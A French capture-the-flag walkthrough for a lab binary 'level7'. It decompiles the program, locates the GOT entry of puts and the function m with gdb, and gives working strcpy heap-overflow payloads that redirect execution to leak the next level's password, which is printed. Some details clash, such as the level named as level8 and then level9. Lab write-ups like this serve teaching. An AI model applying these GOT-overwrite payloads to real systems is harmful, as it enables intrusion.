# LEVEL 7
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level8`.

1. Une fois connecté à la VM sur le `level7`, l'on retrouve un fichier `level7` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

    ```sh
    > scp -P 4242 level7@127.0.0.1:level7 /path/on/machine/host
    ```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <time.h>

    char c[68];

    void m(void* param_1, int param_2, char param_3, int param_4, int param_5) {
    	time_t tVar1;

    	tVar1 = time(NULL); # (time_t *)0x0 = NULL
    	printf("%s - %ld\n", c, (long) tVar1);
    }

    int main(int ac, char** argv)
    {
    	int* puVar1;
    	void* pvVar2;
    	int* puVar3;
    	FILE* __stream;

    	puVar1 = (int *) malloc(8);
    	*puVar1 = 1;
    	pvVar2 = malloc(8);
    	puVar1[1] = pvVar2;
    	puVar3 = (int *) malloc(8);
    	*puVar3 = 2;
    	pvVar2 = malloc(8);
    	puVar3[1] = pvVar2;
    	strcpy((char *) puVar1[1], argv[1]);
    	strcpy((char *) puVar3[1], argv[2]);
    	__stream = fopen("/home/user/level8/.pass","r");
    	fgets(c, 68, __stream); // 0x44 = 68 decimal
    	puts("~~");
    	return EXIT_SUCCESS;
    }
	```

    À partir de ce désassemblage, on en déduit que le programme contient 2 fonctions : une fonction `run` avec les paramètres classiques d'un `main` en C (soit `ac` de type `int` et `argv` de type `char **`) et une fonction `m` qui prends 5 paramètres, mais qui ne sont pas utilisées.

    Plus précisément, la fonction `main` effectue les actions suivantes :
    - Alloue de la mémoire pour des entiers et des pointeurs ;
    - Copie les deux premiers arguments, soit `argv[1]` et `argv[2]`, dans des zones mémoires allouées dynamiquement ;
    - Tente d'ouvrir le fichier `/home/user/level8/.pass` contenant le mot de passe du niveau suivant pour y lire son contenu et le stocker dans le tableau de char nommé `c` (qu'on suppose être une variable globale étant donné qu'elle n'est pas définie dans le scope de la fonction) ;
    - Affiche "~~" sur la sortie standard pour indiquer la fin du programme.

    En ce qui concerne la fonction `m`, celle-ci, récupère le temps actuel à l'aide de la fonction `time` et affiche sur la sortie standard la chaîne de caractères `c` (qu'on suppose être une variable globale, encore une fois), suivie de la valeur du temps actuel. Cependant, cette dernière ne semble pas être appelée par la fonction `main`.

4. De fait, il va falloir trouver une façon d'appeler la fonction `m` pour que la variables global `c`, contenant le mot de passe du niveau supérieur, s'affiche dans la sortie standard. Comme pour un des niveaux précédents, nous allons exploiter la fonction `strcpy` pour effectuer un `buffer overflow` et ainsi appeler la fonction `m` au lieu de la fonction `puts`. Ainsi, `main` en voulant exécuter `puts` exécutera `m`.

5. Dans un premier temps, l'on doit récupérer les adresses des fonctions `main` et `m` en utilisant `gdb` sur l'exécutable `level7` puis la commande `info function`.

    ```sh
    > gdb level7
    > info function
    [...]
		0x080484f4  m
		0x08048521  main
	[...]
    ```

    On se retrouve donc avec l'adresse `0x080484f4` pour la fonction `m` et l'adresse `0x08048521` pour la fonction `main`.

6. Dans un deuxième temps, on doit récupérer l'adresse de la fonction `puts` au sein de la fonction `main`. De nouveau, nous allons utiliser `gdb` sur l'exécutable `level7` pour effectuer un `disas` de la fonction `main` puis de l'adresse de la fonction `puts` appelé au sein de main. Pour s'assurer qu'il s'agit de la bonne adresse, nous allons examiner l'adresse trouver dans la GOT (Global Offset Table) en utilisant la commande `x`.

    ```sh
    > gdb level7
    > disas main
    Dump of assembler code for function main:
		[...]
		0x080485f7 <+214>:   call   0x8048400 <puts@plt>
		[...]
	End of assembler dump.
	> disas 0x8048400
	Dump of assembler code for function puts@plt:
		0x08048400 <+0>:     jmp    *0x8049928
		0x08048406 <+6>:     push   $0x28
		0x0804840b <+11>:    jmp    0x80483a0
	End of assembler dump.
	> x 0x8049928
	0x8049928 <puts@got.plt>:       0x08048406
    ```

    Ainsi, nous obtenons l'adresse `0x8049928` pour la fonction `puts`, tant bien au sein de la fonction `main` qu'au sein de la GOT.

    Pour info :
    - GOT, Global Offset Table : La Global Offset Table est une table qui indexe pour chaque fonction externe ou variable global externe son adresse globale.

7. Maintenant, que nous avons toutes les adresses nécessaires à l'exploit, l'on peut générer les payloads ci-dessous (un pour chacun des arguments utilisés dans le `main`, soit 2 pour [1]` et `argv[2]`).

    - Premier payload :
        ```sh
        > python -c 'print "A" * 20 + "\x28\x99\x04\x08"'
        ```
        On a :
        - `"A" * 20`: La chaîne de caractères nécessaire au `buffer overflow` (nous avons tester de 16 à 25) ;
        - `\x28\x99\x04\x08`: L'adresse de la fonction `puts` dans la GOT en format little-endian.

    - Second payload :
        ```sh
        > python -c 'print "\xf4\x84\x04\x08"'
        ```
        On a :
        - `\xf4\x84\x04\x08`: L'adresse de la fonction `m` en format little-endian.

8. Il manque plus qu'à lancer le programme avec les payloads précédemment définie pour `buffer overflow` les fonctions `strcpy`, que la fonction `m` soit appelée au lieu de la fonction `puts` et que cette dernière affiche dans la sortie standard le contenu de fichier `/home/user/level9/.pass` stocké dans la variable global `c`.

    ```sh
    > ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    ```

9. On peut à présent passer au niveau supérieur en exécutant la commande `su level9` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su level9
    Password :
    > 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    ```
